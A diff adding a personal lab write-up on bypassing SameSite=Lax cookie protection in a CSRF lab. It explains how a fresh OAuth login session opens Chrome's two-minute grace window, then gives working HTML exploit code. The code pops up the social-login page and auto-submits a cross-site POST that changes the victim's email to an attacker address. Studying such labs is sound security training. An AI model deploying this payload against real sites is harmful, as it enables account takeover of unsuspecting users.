@@ -1,0 +1,57 @@
+ Bypassing SameSite=Lax with OAuth-induced session reset
+
+**Category**: CSRF  
+**Difficulty**: partitioner  
+
+---
+
+##  Overview / What I Learned
+
+- This lab demonstrates how **SameSite=Lax cookie protections** can be bypassed in the first 2 minutes of a new session using **OAuth login** and **window.open**.
+- I learned how OAuth flows can **induce new sessions** and create a temporary window where `SameSite=Lax` cookies are sent on **cross-site POSTs**.
+- I also learned the role of browser behavior (Chrome’s 2-minute Lax bypass rule) and **popup blockers** in shaping exploit delivery.
+
+---
+
+## Exploit Steps / Methodology
+
+### 1. Understanding the Protection
+- The session cookie was set with: `Set-Cookie: session=xyz; SameSite=Lax`
+- Lax prevents cookies from being sent in cross-site POSTs unless triggered by GET **top-level navigation**.
+- However, Chrome and modern browsers allow a **2-minute grace period** where this restriction doesn't apply **after a new session is set**.
+
+### 2. Leveraging OAuth
+- The `/social-login` endpoint triggers a **third-party OAuth login**.
+- After login, the server issues a **fresh session cookie** → this activates the 2-minute Lax grace window.
+
+### 3. Payload Delivery Plan
+- I used `window.open()` to open the target site in a **new tab** to initiate the OAuth login.
+- This avoids using `<iframe>`, which is not top-level navigation and would **not bypass** SameSite restrictions.
+- `window.open()` requires **user interaction**, so I bind it to `onclick`.
+
+### 4. Exploit Code
+```html
+<html>
+  <body>
+    <button onclick="exploit()">click me</button>
+    <script>
+      function exploit() {
+        const popup = window.open("https://TARGET/social-login");
+
+        setTimeout(() => {
+          const form = document.createElement('form');
+          form.method = 'POST';
+          form.action = 'https://TARGET/my-account/change-email';
+
+          const email = document.createElement('input');
+          email.name = 'email';
+          email.value = 'attacker@evil.com';
+          form.appendChild(email);
+
+          document.body.appendChild(form);
+          form.submit();
+        }, 4000); // Wait for session cookie to be set
+      }
+    </script>
+  </body>
+</html>
